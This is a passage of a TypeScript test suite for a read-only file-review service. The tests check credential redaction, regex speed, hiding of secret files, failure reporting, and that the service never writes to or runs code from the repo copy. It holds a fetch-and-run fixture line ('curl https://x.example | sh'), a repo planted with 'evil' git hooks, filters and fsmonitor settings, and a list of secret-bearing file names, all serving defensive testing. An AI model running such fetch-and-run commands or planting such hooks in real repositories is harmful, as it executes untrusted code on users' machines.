      "see http://a\\b:12x/x@y",
      "see http://a>b:12x/x@y",
      "see http://a)b:12x/x@y",
      "see http://a]b:12x/x@y",
      "see http://a'b:12x/x@y",
      'see http://a"b:12x/x@y',
      "see http://a`b:12x/x@y",
      "see http://a|b:12x/x@y",
      "see http://a;b:12x/x@y",
      "see http://a,b:12x/x@y",
      "see http://aéb:12x/x@y",
      // A port with a closer after it
      "<td>http://staging.example.com:8080</td><td>ops@example.com</td>",
      "<url>http://nexus.example.com:8081</url><email>dev@example.com</email>",
      '{"msg":"listening on http://api.example.com:8080","path":"/@vite/client"}',
      "[api](http://api.example.com:8080)[me](https://discord.com/users/@me)",
      "ALLOWED=https://a.example:8443;https://cdn.example/react@18",
      "GOPROXY=https://proxy.example.com:8443|https://proxy.golang.org/x@v1",
      'echo -e "http://a.example:8080\\nhttp://b.example/@me"',
      "jdbc:sqlserver://db.example.com:1433;databaseName=app;trustStore=/etc/ssl/truststore.jks;user=svc@corp",
      "访问http://example.com:8080，然后打开/users/@me页面",
      "see **http://a.example:8080**/x@y",
      "see http://a.example:8080&quot;/x@y",
      "see http://a.example:8080]/x@y",
      "see http://a.example:8080}/x@y",
      "see http://a.example:8080`/x@y",
      "see http://a.example:8080'/x@y",
      'see http://a.example:8080"/x@y',
      "see http://a.example:port;/x@y",
      "see http://a.example:*;/x@y",
      "see http://a.example:$PORT;/x@y",
      // The same in strings with escaped quotes
      '{\\"url\\":\\"https://api.example:8443\\",\\"path\\":\\"/@me\\"}',
      '"body": "{\\"a\\":\\"https://api.example:8443\\",\\"b\\":\\"/users/@me\\"}"',
      // A later `://` after a host with a port
      "[a](https://a.example:8443)[b](https://b.example/@c)",
      "<https://a.example:8443>,<https://b.example/@c>",
      "<http://a.example:8080>,<https://b.example/@c>",
      "http://a.example:8080|https://b.example/@c",
      // A string that ends at a host's `:`, joined to the port
      "'https://api.example.com:'+p+'/users/@me'",
      '"http://example.com:"+port+"/x@y"',
      "'http://example.com:'.$port.'/x@y'",
      'echo "http://api.example.com:"$PORT"/@me"',
      "SELECT 'http://api.example.com:'||port||'/@'||handle FROM users;",
      "SELECT CONCAT('http://api.example.com:',port,'/@',handle) FROM users;",
      'const u=["http://api.example.com:",port,"/@me"].join("");',
      '="http://api.example.com:"&A2&"/@"&B2',
      'url = "http://api.example.com:"<>port<>"/@"<>user',
      '{{ "http://api.example.com:"~port~"/@"~user }}',
      'url <- paste0("http://api.example.com:",port,"/@",user)',
      'str("http://api.example.com:")+str(port)+"/@me"',
      // The price of those: a password that starts with its opening quote and a comma reads the same.
      '"postgres://u:",b/c@h"',
      // The other two quotes, closing before an `@` that isn't in the string
      "'http://a.example:foo/c','me@x.example'",
      "`http://a.example:foo/c`,`me@x.example`",
      // An `@` that is in no URL, then a URL with none
      "me@x.example https://a.example:abc/x",
      // An `@` after a blank, which ends a URL
      `x://${"a".repeat(401)} me@x.example`,
      "http://h.example:ab/cd\tme@x.example",
      // Past `USERINFO`'s limit, a string that ends before an `@` that isn't in it
      `"http://${"a".repeat(401)}","b@c:d/e@f"`,
      // No user at all
      "https://@example.com/x",
      // A file has a path and no password
      "file://C:/Users/first.last@corp/doc.txt",
      "FILE://C:/Users/first.last@corp/doc.txt",
      'open("file://D:/share/me@corp/doc.txt")',
      // A password that starts with `//` after a user that reads as a scheme, with a `/`, `?` or `#` to follow. This is
      // a limit, not a choice: to anything that reads it, that `//` is the next URL's.
      "postgres://u://x/y@h",
      "mysql://root://p#ss@h",
      "https://u://p?q@h",
    ])("leaves %s", (line) => {
      const text = `${line}\n`;
      expect(redactFile(text)).toBe(text);
      expect(holdsCredential(text)).toBe(false);
    });

    it("keeps a file with a name like a key's in the list", () => {
      expect(isReviewPath("src/task-admin-dashboard-settings.ts")).toBe(true);
    });

    it.each([
      "docs/task-admin-Q3-2024-report-final.pdf",
      "dist/assets/disk-admin-settings-CkL9dE2f.js",
      "src/stripe_whsec_utils/handlers/verify/index.ts",
    ])("keeps %s in the list", (path) => {
      expect(isReviewPath(path)).toBe(true);
    });

    describe("in a megabyte built to be slow", () => {
      const fill = (piece: string, n = 1_000_000) => piece.repeat(Math.ceil(n / piece.length)).slice(0, n);

      // Eight megabytes through the last step alone, which takes milliseconds: a pattern that starts from each of a
      // scheme's letters reads every tail 31 times, and is still linear, so only its cost can show.
      it.each([
        ["tails after long schemes", `${`${"a".repeat(31)}://${"x".repeat(4000)}\n`.repeat(2000)}@`],
        ["a long authority before a scheme", `a://${"c".repeat(8_000_000)}://d/@`],
        [
          "authorities that each end in a scheme",
          `${`${"x".repeat(369)}${"a".repeat(31)}://`.repeat(20_000)}/@`,
        ],
      ])("reads %s once", (_, text) => {
        const at = performance.now();
        redactLast(text);
        expect(performance.now() - at).toBeLessThan(500);
      });

      it.each([
        ["bare ://", `${"://".repeat(1000)}@`],
        ["a :// with no scheme before it", "!://x@".repeat(500)],
      ])("looks no further into %s than where a scheme should be", (_, text) => {
        const tests = vi.spyOn(RegExp.prototype, "test");
        redactLast(text);
        const count = tests.mock.calls.length;
        tests.mockRestore();
        expect(count).toBeLessThan(20);
      });

      it("doesn't look for a URL in a text with no @", () => {
        const searches = vi.spyOn(String.prototype, "indexOf");
        redactLast("a://b:c/ ".repeat(100));
        const count = searches.mock.calls.filter(([what]) => what === "://").length;
        searches.mockRestore();
        expect(count).toBe(0);
      });

      it("looks for the next URL's scheme only at the end of an authority", () => {
        const replaces = vi.spyOn(String.prototype, "replace");
        redactLast(`a://${"c".repeat(1000)}://d/@`);
        const read = replaces.mock.contexts
          .filter((_, i) => String(replaces.mock.calls[i]?.[0]).endsWith(":$/i"))
          .map((text) => String(text).length);
        replaces.mockRestore();
        expect(read).toEqual([32]);
      });

      it("looks for a run's last @ once, however many URLs are in it", () => {
        const searches = vi.spyOn(String.prototype, "lastIndexOf");
        redactLast(`${"a://b:c/".repeat(1000)}@`);
        const count = searches.mock.calls.filter(([what]) => what === "@").length;
        searches.mockRestore();
        expect(count).toBeLessThan(20);
      });

      it("looks for a string's end once when it ends past the first /", () => {
        const text = `"a://u:p/${'\\"'.repeat(1000)}"@`;
        const searches = vi.spyOn(String.prototype, "indexOf");
        redactLast(text);
        const count = searches.mock.calls.length;
        searches.mockRestore();
        expect(count).toBeLessThan(1500);
      });

      it.each([
        ["URLs with nothing to end them", fill("a://b:c/")],
        ["URLs and one @ at the end", `${fill("a://b:c/", 999_000)}@`],
        ["URLs and one @ at the start", `@${fill("a://b:c/")}`],
        ["URLs between blanks", `@ ${fill("a://b:c/ ")}`],
        ["URLs between blanks, with no /", `@ ${fill("a://b:c ")}`],
        ["ports and one @", `${fill("a://b:1/", 999_000)}@`],
        ["strings, each with a URL", `@ ${fill('"a://b:c/x" ')}`],
        ["strings with no blanks", `${fill('"a://b:c/', 999_000)}@`],
        ["strings of two kinds", `${fill(`"a://b:c/'a://b:c/`, 999_000)}@`],
        ["a host of colons", `a://${fill(":", 999_000)}/@`],
        ["strings with one end, past escaped quotes", `"a://b:c/@${fill('\\"', 999_000)}"`],
        ["strings and escaped quotes in turn", fill('"a://b:c/@ \\" ')],
        ["escaped strings and quotes in turn", fill('\\"a://b:c/@ " ')],
        ["a host of brackets", `a://${fill("[", 999_000)}]/@`],
        ["a host of @ and colons", `a://${fill("@:", 999_000)}/@`],
        ["one long authority", `a://${fill("y")}`],
        ["authorities just past the old limit", fill(`x://${"y".repeat(401)}/`)],
        ["one long password", `postgres://u:ab/${fill("c", 999_000)}@h`],
        ["query names", fill("?token=")],
        ["one long query value", `?token=${fill("a")}`],
        ["letters before a scheme", `${fill("a", 999_000)}://b:c/d@e`],
        ["prefixes", fill("ghp_github_pat_sk-ant-AIzaxoxb-1AKIAnpm_whsec_sk_live_")],
        ["a prefix one short of a token", fill(`ghp_${"a".repeat(35)} `)],
        ["a prefix of a long kind", fill(`github_pat_${"a".repeat(19)}_`)],
        ["a dash after a prefix", `xoxb-1${fill("-")}`],
        ["a long webhook secret", `whsec_${fill("a", 999_000)}_`],
        ["short webhook secrets", fill(`whsec_${"a".repeat(7)}`)],
        ["a token's end with a long head", `${fill("a", 999_000)}.eyJabcdefgh.x`],
        ["token starts before a token's end", `${fill("eyJ-", 999_000)}.eyJabcdefgh.x`],
        ["strings closed before the next /", `@ ${fill('"a://b:c",', 999_000)}/@`],
        ["strings closed before the next /, no blanks", `${fill('"a://b:c",', 999_000)}/@`],
        ["one string past escaped quotes, from the start", `"a://b:c${fill('\\"', 999_000)}"/@`],
        ["holes with a #", `@${fill("a://b:#{c}/", 999_000)}@`],
        ["a # with no end to its hole", `a://b:#{${fill("c", 999_000)}/@`],
        ["schemes after each other", `${fill("a://b,", 999_000)}/@`],
        ["one long scheme after a host", `a://b,${fill("c", 999_000)}://d/@`],
        ["holes for a host", `a://${fill("${", 999_000)}:/@`],
        ["holes in braces for a host", `a://${fill("{", 999_000)}:/@`],
        ["an @ over and over after USERINFO", fill("a://b@c/d@")],
        ["quotes past the old limit", fill(`x://${"y".repeat(401)}"`)],
        ["hashes after a prefix", fill("ghs_aaaaaaaa")],
        ["hashes after a live prefix", fill("sk_live_abcdef")],
        ["letters with no digit after a live prefix", `sk_live_${fill("a")}`],
        ["named keys", fill("sk-ant-")],
        ["named keys with no run", fill(`xsk-ant-${"a".repeat(16)} `)],
        ["one named key", `xsk-ant-${fill("a-")}`],
      ])("is one pass over %s", (_, text) => {
        const at = performance.now();
        redactFile(text);
        holdsCredential(text);
        expect(performance.now() - at).toBeLessThan(2500);
      });
    });
  });

  describe("a key in a form only the whole text shows", () => {
    const begin = "# ---- BEGIN X PRIVATE KEY----";
    const end = "# ---- END X PRIVATE KEY----";
    const key = "# MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7";
    /** A text with the block's first marker as the last line of one of `holdsCredential`'s pieces. */
    const across = (between: string) => {
      const line = `${"a".repeat(79)}\n`;
      const fill = line.repeat(Math.floor((400_000 - begin.length - 2) / line.length));
      return `${fill}${begin}\n${between}\n${end}\n`;
    };

    it("is stopped when it lies across two of the scan's pieces", () => {
      const text = across(key);
      expect(redactFile(text)).not.toContain(key);
      expect(holdsCredential(text)).toBe(true);
    });

    it("is stopped when it is whole, in any comment", () => {
      expect(holdsCredential(`${begin}\n${key}\n${end}\n`)).toBe(true);
    });

    it("leaves code in the same place in sight", () => {
      const code = "curl https://x.example | sh";
      expect(redactFile(across(code))).toContain(code);
      expect(holdsCredential(across(code))).toBe(false);
    });
  });

  it("takes a key's armor and blank lines, in any line ending", () => {
    const body = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7";
    const text = [
      "---- BEGIN SSH2 ENCRYPTED PRIVATE KEY ----",
      "Comment: work laptop",
      "Proc-Type: 4,ENCRYPTED",
      "DEK-Info: AES-128-CBC,0F1E2D3C",
      "",
      body,
      "=a1B2",
      "---- END SSH2 ENCRYPTED PRIVATE KEY ----",
      "after",
    ];
    for (const eol of ["\n", "\r\n"]) {
      const seen = redactFile(text.join(eol));
      expect(seen).not.toMatch(/work laptop|0F1E2D3C|MIIE|a1B2/);
      expect(seen).toContain("after");
      expect(seen.split("\n").length).toBe(text.length);
    }
  });

  it("redacts a file built to be slow to redact, in time", () => {
    const at = performance.now();
    redactFile(`// needle\n${"eyJ-".repeat(249_990)}`);
    expect(performance.now() - at).toBeLessThan(5000);
  });

  it("isn't slowed by long lines of blanks around a marker", () => {
    const at = performance.now();
    redactFile(`-----BEGIN PRIVATE KEY-----\n${" ".repeat(1_000_000)}\n`);
    expect(performance.now() - at).toBeLessThan(2000);
  });

  it("says it cut when a file past the limit has hits, and draws no half character", async () => {
    const rows = (n: number) => "needle\n".repeat(n);
    const out = rig();
    for (let i = 0; i < 25; i++) out.write(`a${String(i).padStart(2, "0")}.txt`, rows(MAX_FILE_HITS));
    out.write("z.txt", rows(1));
    const r = await out.port.search(out.copy, "needle", true);
    expect(r.hits).toHaveLength(MAX_HITS);
    expect(r.truncated).toBe(true);
    const w = rig();
    w.write("e.txt", `needle ${"😀".repeat(300)}\n`);
    w.write("f.txt", `${"😀".repeat(300)} needle ${"😀".repeat(300)}\n`);
    for (const h of (await w.port.search(w.copy, "needle", true)).hits) {
      expect(
        /[\ud800-\udbff](?![\udc00-\udfff])|(?<![\ud800-\udbff])[\udc00-\udfff]/.test(h.text),
        h.path,
      ).toBe(false);
    }
  });

  it("isn't told by the copy's attributes what is binary", async () => {
    const w = rig();
    writeFileSync(join(w.cwd, ".gitattributes"), "a.txt binary\n");
    w.write("a.txt", "needle\n");
    expect((await w.port.search(w.copy, "needle", true)).hits.map((h) => h.path)).toContain("a.txt");
  });

  it("doesn't call a warning about attributes a file it couldn't read", async () => {
    const w = rig();
    writeFileSync(join(w.cwd, ".gitattributes"), `!*.txt diff\n${"x".repeat(5000)} diff\n`);
    expect((await w.port.search(w.copy, "needle", true)).partial).toBe(false);
  });

  it("still finds a line after a label that has nothing to do with it", async () => {
    const w = rig();
    w.write("a.yaml", "name:\n  needle\n");
    expect((await w.port.search(w.copy, "needle", true)).hits.map((h) => h.path)).toContain("a.yaml");
  });

  it("doesn't look in a file that usually holds secrets", async () => {
    const w = rig();
    const names = [
      ".env",
      "prod.env",
      ".envrc",
      ".env-prod",
      ".PYPIRC",
      ".pgpass",
      "certs/server.pem",
      "a.ppk",
    ];
    for (const name of names) w.write(name, "needle\n");
    const r = await w.port.search(w.copy, "needle", true);
    expect(r.hits.map((h) => h.path)).toEqual(["gone.txt"]);
  });

  it("treats a file with a NUL as the viewer does, attributes or not", async () => {
    const w = rig();
    writeFileSync(join(w.cwd, ".gitattributes"), "* diff\n");
    w.write("wide.txt", "n\0e\0needle\0\n");
    const r = await w.port.search(w.copy, "needle", true);
    expect(r.hits.map((h) => h.path)).toEqual(["gone.txt"]);
  });

  it("cuts a long line around the match, however far along it is", async () => {
    const w = rig();
    w.write("min.js", `${"a".repeat(5000)}needle${"b".repeat(5000)}\n`);
    const hit = (await w.port.search(w.copy, "needle", false)).hits.find((h) => h.path === "min.js");
    expect(hit?.text.startsWith("…")).toBe(true);
    expect(hit?.text.length).toBeLessThan(410);
    expect(hit?.text).toContain("needle");
  });

  it("finds a match past where a character's lower case changes the line's length", async () => {
    const w = rig();
    w.write("t.txt", `${"İ".repeat(300)} needle\n`);
    const hit = (await w.port.search(w.copy, "NEEDLE", false)).hits.find((h) => h.path === "t.txt");
    expect(hit?.text).toContain("needle");
  });

  it("leaves out a file over the viewer's limit", async () => {
    const w = rig();
    w.write("big.log", `needle\n${"x".repeat(1_100_000)}\n`);
    expect((await w.port.search(w.copy, "needle", true)).hits.map((h) => h.path)).toEqual(["gone.txt"]);
  });

  it("keeps to its limits, and says so", async () => {
    const w = rig();
    w.write("log.txt", "needle\n".repeat(MAX_FILE_HITS + 5));
    const r = await w.port.search(w.copy, "needle", true);
    expect(r.hits.filter((h) => h.path === "log.txt")).toHaveLength(MAX_FILE_HITS);
    expect(r.truncated).toBe(true);
    const many = rig();
    for (let i = 0; i < 30; i++) many.write(`d/f${i}.txt`, "needle\n".repeat(MAX_FILE_HITS));
    const all = await many.port.search(many.copy, "needle", true);
    expect(all.hits).toHaveLength(Math.min(MAX_HITS, 30 * MAX_FILE_HITS + 1));
    const over = rig();
    for (let i = 0; i < MAX_SEARCH_FILES + 3; i++) over.write(`f${i}.txt`, "needle\n");
    const cut = await over.port.search(over.copy, "needle", true);
    expect(cut.truncated).toBe(true);
    expect(cut.hits.length).toBeLessThanOrEqual(MAX_SEARCH_FILES);
  });

  it("lets no name with a newline pass as another file", async () => {
    const w = rig();
    w.write("zz\nREADME.md", "needle: this line is not in README.md\n");
    expect((await w.port.search(w.copy, "needle: this", true)).hits).toEqual([]);
  });

  it("calls a search that failed a failure, not no results", async () => {
    const w = rig();
    // A git that dies on `grep`: on the PATH, since the script clears everything else from git's environment.
    const shim = join(w.root, "bin");
    mkdirSync(shim);
    const real = execFileSync("which", ["git"], { encoding: "utf8" }).trim();
    writeFileSync(
      join(shim, "git"),
      `#!/bin/sh\ncase " $* " in *" grep "*) exit 2 ;; esac\nexec ${real} "$@"\n`,
      { mode: 0o755 },
    );
    const dead: RunScript = async (_who, script) =>
      bash(`export PATH=${shim}:$PATH\n${script.replaceAll("/home/employee/work", join(w.root, "work"))}`);
    await expect(reviewPort(dead).search(w.copy, "needle", false)).rejects.toThrow();
    expect(() => readSearch("@@fail the search could not be run\n", NONCE, "x", false)).toThrow(/could not/);
  });

  it("says when the folder isn't there", async () => {
    const w = rig();
    execFileSync("rm", ["-rf", w.cwd]);
    expect((await w.port.search(w.copy, "x", false)).present).toBe(false);
  });

  it("refuses what isn't a line of words", () => {
    const w = rig();
    for (const bad of ["", "   ", "a\nb", "a\0b", "\uffff", "x".repeat(MAX_QUERY + 1), 3, null]) {
      expect(isSearchQuery(bad)).toBe(false);
    }
    expect(() => searchScript(w.copy, "a\nb", false, NONCE)).toThrow(/search for/);
  });
});

describe("a failure isn't an answer", () => {
  /** A stand-in for a tool on the PATH: the script clears everything else from its environment. */
  function shim(w: ReturnType<typeof rig>, tool: string, body: string) {
    const dir = join(w.root, "bin");
    mkdirSync(dir, { recursive: true });
    const real = execFileSync("which", [tool], { encoding: "utf8" }).trim();
    writeFileSync(join(dir, tool), `#!/bin/bash\n${body.replaceAll("REAL", real)}\n`, { mode: 0o755 });
    const run: RunScript = async (_who, script) =>
      bash(`export PATH=${dir}:$PATH\n${script.replaceAll("/home/employee/work", join(w.root, "work"))}`);
    return reviewPort(run);
  }

  it("doesn't call a search whose grep was killed no results", async () => {
    const w = rig(false);
    w.write("a.txt", "needle\n");
    await expect(shim(w, "grep", "kill -9 $$").search(w.copy, "needle", false)).rejects.toThrow();
  });

  it("doesn't call a killed `find` an empty folder", async () => {
    const w = rig(false);
    w.write("a.txt", "x\n");
    await expect(shim(w, "find", "kill -9 $$").tree(w.copy)).rejects.toThrow();
  });

  it("says a folder it couldn't read may be missing files", async () => {
    const w = rig(false);
    w.write("a.txt", "x\n");
    const t = await shim(w, "find", 'REAL "$@"; exit 1').tree(w.copy);
    expect(t.paths).toEqual(["a.txt"]);
    expect(t.partial).toBe(true);
  });

  it("carries on past a file plain grep can't read, and says so", async () => {
    const w = rig(false);
    w.write("a.txt", "needle\n");
    w.write("b.txt", "needle\n");
    chmodSync(join(w.cwd, "b.txt"), 0);
    const r = await w.port.search(w.copy, "needle", false);
    chmodSync(join(w.cwd, "b.txt"), 0o644);
    expect(r.hits.map((h) => h.path)).toEqual(["a.txt"]);
    expect(r.partial).toBe(true);
  });

  it("doesn't call a file it can't read empty", async () => {
    const w = rig();
    w.write("locked.txt", "x\n");
    chmodSync(join(w.cwd, "locked.txt"), 0);
    const side = await w.port.read(w.copy, "locked.txt");
    chmodSync(join(w.cwd, "locked.txt"), 0o644);
    expect(side).toEqual({ state: "other" });
  });

  it("says a file it couldn't bring out may be missing, not that nothing matched", async () => {
    const w = rig();
    expect((await shim(w, "head", "exit 3").search(w.copy, "needle", false)).partial).toBe(true);
  });

  it("says a file git couldn't read may be missing", async () => {
    const w = rig();
    w.write("locked.txt", "needle\n");
    chmodSync(join(w.cwd, "locked.txt"), 0);
    const r = await w.port.search(w.copy, "needle", false);
    chmodSync(join(w.cwd, "locked.txt"), 0o644);
    expect(r.partial).toBe(true);
    expect(r.hits.map((h) => h.path)).toContain("gone.txt");
  });

  it("doesn't lose the last file to the note that the list was cut", async () => {
    const w = rig(false);
    for (let i = 0; i < MAX_SEARCH_FILES + 5; i++)
      w.write(`f${String(i).padStart(3, "0")}.txt`, "needle12\n");
    const r = await w.port.search(w.copy, "needle", true);
    expect(r.truncated).toBe(true);
    expect(r.hits).toHaveLength(MAX_SEARCH_FILES);
  });

  it("reads past a filter name that can't be passed on git's command line", async () => {
    const w = rig();
    git(w.cwd, "config", "filter.a b'c=d.clean", "cat");
    expect((await w.port.list(w.copy)).present).toBe(true);
    expect((await w.port.file(w.copy, "keep.txt")).after.state).toBe("text");
  });

  it("limits a search's memory", () => {
    const w = rig();
    expect(searchScript(w.copy, "x", false, NONCE)).toContain("ulimit -v");
  });
});

describe("it only reads", () => {
  it("writes nothing to a partial clone's config for a commit it lacks, on git older than GIT_NO_LAZY_FETCH", async () => {
    const w = rig();
    w.write("keep.txt", "changed\n");
    git(w.cwd, "add", "-A");
    git(w.cwd, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", "work");
    const main = git(w.cwd, "rev-parse", "refs/remotes/origin/main");
    git(w.cwd, "update-ref", "refs/remotes/origin/main", git(w.cwd, "rev-parse", "HEAD~1"));
    git(w.cwd, "config", "remote.origin.url", join(w.root, "nowhere"));
    git(w.cwd, "config", "remote.origin.promisor", "true");
    git(w.cwd, "config", "extensions.partialClone", "origin");
    git(w.cwd, "config", "core.repositoryformatversion", "1");
    execFileSync("rm", ["-f", join(w.cwd, ".git/objects", main.slice(0, 2), main.slice(2))]);
    const config = readFileSync(join(w.cwd, ".git/config"), "utf8");
    const old: RunScript = async (_who, script) =>
      bash(
        script
          .replaceAll("GIT_NO_LAZY_FETCH=1", "IGNORED=1")
          .replaceAll("/home/employee/work", join(w.root, "work")),
      );
    const port = reviewPort(old);
    await port.tree(w.copy).catch(() => null);
    await port.search(w.copy, "needle", false).catch(() => null);
    await port.file(w.copy, "keep.txt").catch(() => null);
    await port.list(w.copy).catch(() => null);
    expect(readFileSync(join(w.cwd, ".git/config"), "utf8")).toBe(config);
  });

  it("doesn't fetch a missing object on git older than GIT_NO_LAZY_FETCH", async () => {
    // A partial clone of a server: the old blob isn't here, so asking for it would fetch it and write to .git.
    const w = rig(false);
    const server = join(w.root, "server");
    mkdirSync(server);
    git(server, "init", "-q", "-b", "main");
    git(server, "config", "uploadpack.allowFilter", "true");
    git(server, "config", "uploadpack.allowAnySHA1InWant", "true");
    const save = (m: string) => {
      git(server, "add", "-A");
      git(server, "-c", "user.name=a", "-c", "user.email=a@example.invalid", "commit", "-q", "-m", m);
    };
    writeFileSync(join(server, "a.txt"), "old\n");
    save("old");
    git(server, "branch", "conv");
    git(server, "checkout", "-q", "conv");
    writeFileSync(join(server, "a.txt"), "new\n");
    save("new");
    execFileSync("rm", ["-rf", w.cwd]);
    git(w.root, "clone", "-q", "--filter=blob:none", "-b", "conv", `file://${server}`, w.cwd);
    const missing = git(server, "rev-parse", "main:a.txt");
    const has = () => {
      try {
        execFileSync("git", ["-c", "core.hooksPath=/dev/null", "cat-file", "-e", missing], {
          cwd: w.cwd,
          env: { ...env, GIT_ALLOW_PROTOCOL: "none" },
          stdio: "ignore",
        });
        return true;
      } catch {
        return false;
      }
    };
    expect(has()).toBe(false);
    // Git 2.43, in the image, knows nothing of this variable.
    const old: RunScript = async (_who, script) =>
      bash(
        script
          .replaceAll("GIT_NO_LAZY_FETCH=1", "IGNORED=1")
          .replaceAll("/home/employee/work", join(w.root, "work")),
      );
    const port = reviewPort(old);
    const copy = { ...w.copy, base: "main" };
    expect((await port.file(copy, "a.txt")).after).toEqual({ state: "text", text: "new\n" });
    // The list needs that blob, so it says it can't be read: that, not a fetch.
    await expect(port.list(copy)).rejects.toThrow(/could not be read/);
    expect(has()).toBe(false);
  });

  it("changes nothing in the copy, however much it lists, opens and searches", async () => {
    const w = rig();
    w.write("new.txt", "needle\n");
    w.write("keep.txt", "edited needle\n");
    const status = git(w.cwd, "status", "--porcelain");
    const before = fingerprint(join(w.cwd, ".git"));
    await w.port.tree(w.copy);
    await w.port.read(w.copy, "keep.txt");
    await w.port.search(w.copy, "needle", false);
    expect(fingerprint(join(w.cwd, ".git"))).toBe(before);
    expect(git(w.cwd, "status", "--porcelain")).toBe(status);
  });

  it("writes nothing to .git with a split index on, and runs nothing of the copy's", async () => {
    const w = rig();
    const evil = `touch ${join(w.root, "ran")}`;
    git(w.cwd, "config", "core.splitIndex", "true");
    git(w.cwd, "update-index", "--split-index");
    git(w.cwd, "config", "core.fsmonitor", evil);
    git(w.cwd, "config", "filter.evil.clean", evil);
    git(w.cwd, "config", "core.pager", evil);
    writeFileSync(join(w.cwd, ".gitattributes"), "*.txt filter=evil\n");
    writeFileSync(join(w.cwd, ".git/hooks/post-index-change"), `#!/bin/sh\n${evil}\n`, { mode: 0o755 });
    const before = readdirSync(join(w.cwd, ".git")).sort();
    await w.port.tree(w.copy);
    await w.port.search(w.copy, "needle", false);
    expect(readdirSync(join(w.cwd, ".git")).sort()).toEqual(before);
    expect(existsSync(join(w.root, "ran"))).toBe(false);
  });
});

const service = (port: ReviewPort, over: { archivedAt?: number | null } = {}) =>
  new ConversationReview({
    conversations: {
      get: (id) =>
        id === "ab12"
          ? { employeeId: "ada", project: "Duet", archivedAt: over.archivedAt ?? null }
          : undefined,
      machineFor: () => null,
    },
    registry: {
      project: () => ({ defaultBranch: "main" }) as never,
      employees: () => [{ id: "ada", name: "Ada" }] as never,
    },
    port,
    waitMs: 30,
  });

const stub = (over: Partial<ReviewPort>): ReviewPort => ({ ...demoReview, ...over });

describe("how a read fails, in a sentence", () => {
  it("says the machine is asleep, and doesn't wake it", async () => {
    const asleep = () => Promise.reject(new MachineNotRunning("inc-ada"));
    const r = service(stub({ tree: asleep, read: asleep, search: asleep }));
    const reason = "Ada's machine is asleep, so the files can't be read right now.";
    expect(await r.files("ab12")).toMatchObject({ state: "asleep", reason, paths: [] });
    expect(await r.search("ab12", "x", false)).toMatchObject({ state: "asleep", reason, hits: [] });
    expect(await r.read("ab12", "a.txt")).toMatchObject({
      state: "asleep",
      reason: "Ada's machine is asleep, so this file can't be read right now.",
    });
  });

  it("says the machine is busy when a read outlasts its wait", async () => {
    const never = () => new Promise<never>(() => {});
    const r = service(stub({ tree: never, search: never }));
    expect((await r.files("ab12")).state).toBe("busy");
    expect((await r.search("ab12", "x", false)).state).toBe("busy");
  });

  it("says busy when a read is still queued behind a stop, through the real queue, and starts nothing", async () => {
    const { wallsMarker: _, ...noWalls } = defaultMachineSettings;
    const settings = { ...noWalls, machineFor: () => "inc-ada" };
    const started: string[][] = [];
    const run = machineScript(
      settings,
      async () => "NAME STATE\ninc-ada running\n",
      undefined,
      (_bin, args) => {
        started.push(args);
        throw new Error("no client here");
      },
    );
    // A stop in hand holds the machine: nothing else may start until it ends.
    let end = () => {};
    const stopping = queueFor(settings).stop("inc-ada", "a stop", () => new Promise<void>((r) => (end = r)));
    const r = service(reviewPort(run));
    expect(await r.files("ab12")).toMatchObject({
      state: "busy",
      reason: "Ada's machine is busy, so the files can't be read right now.",
    });
    expect(await r.search("ab12", "x", false)).toMatchObject({ state: "busy" });
    expect(started).toEqual([]);
    end();
    await stopping;
  });

  it("says a failure in a sentence, with nothing from the machine in it", async () => {
    const r = service(stub({ tree: () => Promise.reject(new Error("/home/employee: secrets")) }));
    expect(await r.files("ab12")).toMatchObject({
      state: "failed",
      reason: "Couldn't read the files in Ada's machine.",
    });
  });

  it("says when the copy was cleaned away, or isn't made yet", async () => {
    const gone = stub({
      tree: async () => ({ present: false, paths: [], skipped: 0, truncated: false, partial: false }),
      read: async () => null,
      search: async () => ({
        present: false,
        hits: [],
        skipped: 0,
        withheld: 0,
        truncated: false,
        partial: false,
      }),
    });
    expect((await service(gone).files("ab12")).reason).toBe("There are no files here yet.");
    expect((await service(gone, { archivedAt: 1 }).files("ab12")).reason).toMatch(/cleaned away/);
    expect((await service(gone).read("ab12", "a.txt")).state).toBe("no-copy");
    expect((await service(gone).search("ab12", "x", false)).state).toBe("no-copy");
  });

  it("names a file that usually holds secrets and never asks the machine for it", async () => {
    let asked = 0;
    const r = service(
      stub({
        read: async () => {
          asked++;
          return { state: "text", text: "x" };
        },
      }),
    );
    expect(await r.read("ab12", "deploy/.env")).toMatchObject({ state: "ok", withheld: true });
    expect(asked).toBe(0);
  });

  it("runs one list at a time, and at most one more after it", async () => {
    let asked = 0;
    let running = 0;
    let most = 0;
    const r = service(
      stub({
        tree: async () => {
          asked++;
          most = Math.max(most, ++running);
          await new Promise((go) => setTimeout(go, 5));
          running--;
          return { present: true, paths: [], skipped: 0, truncated: false, partial: false };
        },
      }),
    );
    await Promise.all([r.files("ab12"), r.files("ab12"), r.files("ab12")]);
    expect(asked).toBe(2);
    expect(most).toBe(1);
  });

  it("answers a request made during a list with a read that starts after it", async () => {
    const copy = ["a.ts"];
    const held: (() => void)[] = [];
    const r = service(
      stub({
        tree: async () => {
          const paths = [...copy];
          await new Promise<void>((go) => held.push(go));
          return { present: true, paths, skipped: 0, truncated: false, partial: false };
        },
      }),
    );
    const before = r.files("ab12");
    // The agent's last edit lands after the running read went past, and the turn's end asks for the list.
    copy.push("last-edit.ts");
    const after = r.files("ab12");
    held.shift()?.();
    expect((await before).paths).toEqual(["a.ts"]);
    await new Promise((go) => setTimeout(go, 0));
    held.shift()?.();
    expect((await after).paths).toEqual(["a.ts", "last-edit.ts"]);
  });

  it("still lists after a list that failed", async () => {
    let asked = 0;
    const held: (() => void)[] = [];
    const r = service(
      stub({
        tree: async () => {
          if (++asked === 1) {
            await new Promise<void>((go) => held.push(go));
            throw new Error("boom");
          }
          return { present: true, paths: [], skipped: 0, truncated: false, partial: false };
        },
      }),
    );
    const first = r.files("ab12");
    const second = r.files("ab12");
    held.shift()?.();
    expect((await first).state).toBe("failed");
    expect((await second).state).toBe("ok");
  });
});

describe("the routes", () => {
  async function app(port: ReviewPort) {
    const a = await createApp({
      dbPath: ":memory:",
      knowledgeDir: mkdtempSync(join(tmpdir(), "inc-files-k-")),
      clock: new FakeClock(),
      machines: new FakeMachines(),
      agent: new FakeAgent(),
      harness: {} as never,
      helper: new FakeHelper(),
      chat: new FakeChat(),
      review: () => port,
    });
    seedDemo(a.deps.registry);
    const res = await a.handle(
